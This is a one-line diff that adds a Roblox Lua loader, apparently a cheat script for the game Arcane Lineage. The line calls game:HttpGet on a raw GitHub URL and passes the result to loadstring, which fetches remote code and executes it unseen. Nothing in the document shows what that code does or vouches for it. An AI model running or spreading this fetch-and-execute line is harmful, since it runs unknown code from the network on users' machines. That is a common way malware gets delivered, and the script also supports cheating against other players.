@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/arcane-lineage-spam7-fwusxxw9o8v63n.lua"))()
